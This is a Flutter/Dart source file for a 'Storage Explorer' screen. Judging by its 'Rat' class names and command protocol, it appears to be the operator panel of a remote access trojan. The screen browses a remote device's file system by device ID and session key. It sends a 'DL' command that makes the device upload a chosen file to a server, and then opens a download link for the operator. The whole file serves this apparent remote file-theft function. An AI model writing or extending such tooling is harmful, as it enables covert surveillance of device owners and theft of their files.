import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'api_service.dart';
import 'constants.dart';

// ============================================================
// GRID PATTERN PAINTER
// ============================================================
class _StorageGridPatternPainter extends CustomPainter {
  final Color gridColor;
  final double spacing;
  
  const _StorageGridPatternPainter({
    required this.gridColor,
    this.spacing = 25,
  });
  
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = gridColor
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;
    
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }
  
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

const _kBg    = Color(0xFF111827);
const _kCard  = Color(0xFF1F2937);
const _kBlue  = Color(0xFF3B82F6);
const _kCyan  = Color(0xFF06B6D4);
const _kAmber = Color(0xFFF59E0B);
const _kSub   = Color(0xFF9CA3AF);

class RatStorageScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const RatStorageScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<RatStorageScreen> createState() => _RatStorageScreenState();
}

class _RatStorageScreenState extends State<RatStorageScreen> {
  late RatApiService _api;
  List<dynamic> _files = [];
  bool _isLoading = true;
  String _error = '', _currentPath = '';

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _fetch();
  }

  Future<void> _fetch({String path = ''}) async {
    setState(() { _isLoading = true; _error = ''; });
    try {
      final data = await _api.listLiveStorage(widget.deviceId, path: path);
      setState(() { _currentPath = data['path']; _files = data['files']; _isLoading = false; });
    } catch (e) {
      setState(() { _isLoading = false; _error = e.toString(); });
    }
  }

  Future<void> _download(String filename) async {
    _snack('Requesting download of $filename...');
    try {
      final fullPath = _currentPath.endsWith('/') ? '$_currentPath$filename' : '$_currentPath/$filename';
      await _api.sendCommand(widget.deviceId, 'DL', args: fullPath);
      for (int i = 0; i < 30; i++) {
        await Future.delayed(const Duration(seconds: 1));
        final resp = await _api.getLastResponse(widget.deviceId);
        if (resp != null && resp['content'] != null) {
          final c = resp['content'].toString();
          if (c.startsWith('RESP:DL:SUCCESS:')) { _showLink(c.substring(16)); return; }
          if (c.startsWith('RESP:DL:ERROR:')) throw Exception(c.substring(14));
        }
      }
      throw Exception('Timeout');
    } catch (e) { _snack('Error: $e', isErr: true); }
  }

  void _showLink(String filename) {
    final url = _api.getDownloadUrl(widget.deviceId, filename);
    showDialog(context: context, builder: (ctx) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _kBlue.withOpacity(0.3))),
      title: const Text('File Ready', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w700)),
      content: const Text('File uploaded to server and ready for download.', style: TextStyle(color: _kSub)),
      actions: [
        TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Close', style: TextStyle(color: _kSub))),
        Container(
          decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(8)),
          child: TextButton(
            onPressed: () async { await launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication); Navigator.pop(ctx); },
            child: const Text('Download', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ),
      ],
    ));
  }

  void _goBack() {
    if (_currentPath.isEmpty || _currentPath == '/') return;
    final last = _currentPath.lastIndexOf('/');
    _fetch(path: last <= 0 ? '/' : _currentPath.substring(0, last));
  }

  void _snack(String m, {bool isErr = false}) => ScaffoldMessenger.of(context).showSnackBar(
    SnackBar(content: Text(m), backgroundColor: isErr ? const Color(0xFFEF4444) : _kCard,
      behavior: SnackBarBehavior.floating, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)), margin: const EdgeInsets.all(16)),
  );

  Widget _buildGridBackground() {
    return Positioned.fill(
      child: CustomPaint(
        painter: _StorageGridPatternPainter(
          gridColor: Colors.white.withOpacity(0.03),
          spacing: 30,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          _buildGridBackground(),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  Colors.black.withOpacity(0.85),
                  _kBlue.withOpacity(0.05),
                  Colors.black.withOpacity(0.9)
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
            ),
          ),
          SafeArea(
            child: Column(children: [
              // Header
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                child: Row(children: [
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)),
                      child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10), boxShadow: [BoxShadow(color: _kBlue.withOpacity(0.3), blurRadius: 10)]),
                    child: const Icon(Icons.folder_rounded, color: Colors.white, size: 18),
                  ),
                  const SizedBox(width: 12),
                  Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    const Text('Storage Explorer', style: TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w700)),
                    Text(_currentPath.isEmpty ? 'Root' : _currentPath, style: const TextStyle(color: _kSub, fontSize: 11), maxLines: 1, overflow: TextOverflow.ellipsis),
                  ])),
                  GestureDetector(
                    onTap: () => _fetch(path: _currentPath),
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)),
                      child: const Icon(Icons.refresh_rounded, color: Colors.white70, size: 18),
                    ),
                  ),
                ]),
              ),
              const SizedBox(height: 12),
              // Back to parent
              if (_currentPath != '/' && _currentPath.isNotEmpty)
                GestureDetector(
                  onTap: _goBack,
                  child: Container(
                    margin: const EdgeInsets.symmetric(horizontal: 16),
                    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                    decoration: BoxDecoration(
                      color: _kCard.withOpacity(0.6),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _kBlue.withOpacity(0.2)),
                    ),
                    child: const Row(children: [
                      Icon(Icons.drive_folder_upload_rounded, color: _kAmber, size: 20),
                      SizedBox(width: 10),
                      Text('.. (Parent Directory)', style: TextStyle(color: Colors.white70, fontSize: 13)),
                    ]),
                  ),
                ),
              const SizedBox(height: 8),
              // Files
              Expanded(
                child: _isLoading
                  ? const Center(child: CircularProgressIndicator(color: _kBlue, strokeWidth: 2))
                  : _error.isNotEmpty
                    ? Center(child: Text(_error, style: const TextStyle(color: Color(0xFFEF4444))))
                    : ListView.builder(
                        padding: const EdgeInsets.symmetric(horizontal: 16),
                        physics: const BouncingScrollPhysics(),
                        itemCount: _files.length,
                        itemBuilder: (_, i) => _buildFile(_files[i]),
                      ),
              ),
            ]),
          ),
        ],
      ),
    );
  }

  Widget _buildFile(dynamic file) {
    final isDir = file['is_dir'] == true;
    final name = file['name'] ?? 'Unknown';
    final size = file['size'] ?? 0;
    String sizeStr = size > 1024 * 1024 ? '${(size / 1048576).toStringAsFixed(1)} MB' : '${(size / 1024).toStringAsFixed(1)} KB';

    return GestureDetector(
      onTap: isDir ? () {
        final path = _currentPath.endsWith('/') ? '$_currentPath$name' : '$_currentPath/$name';
        _fetch(path: path);
      } : null,
      child: Container(
        margin: const EdgeInsets.only(bottom: 6),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        decoration: BoxDecoration(
          color: _kCard.withOpacity(0.7),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: isDir ? _kAmber.withOpacity(0.2) : _kBlue.withOpacity(0.15)),
        ),
        child: Row(children: [
          Container(
            padding: const EdgeInsets.all(7),
            decoration: BoxDecoration(
              color: isDir ? _kAmber.withOpacity(0.1) : _kBlue.withOpacity(0.1),
              borderRadius: BorderRadius.circular(8),
            ),
            child: Icon(isDir ? Icons.folder_rounded : Icons.insert_drive_file_rounded, color: isDir ? _kAmber : _kBlue, size: 18),
          ),
          const SizedBox(width: 12),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(name, style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w500)),
            if (!isDir) Text(sizeStr, style: const TextStyle(color: _kSub, fontSize: 11)),
          ])),
          if (!isDir) GestureDetector(
            onTap: () => _download(name),
            child: Container(
              padding: const EdgeInsets.all(7),
              decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(8)),
              child: const Icon(Icons.download_rounded, color: Colors.white, size: 16),
            ),
          ),
          if (isDir) const Icon(Icons.chevron_right_rounded, color: _kSub, size: 18),
        ]),
      ),
    );
  }
}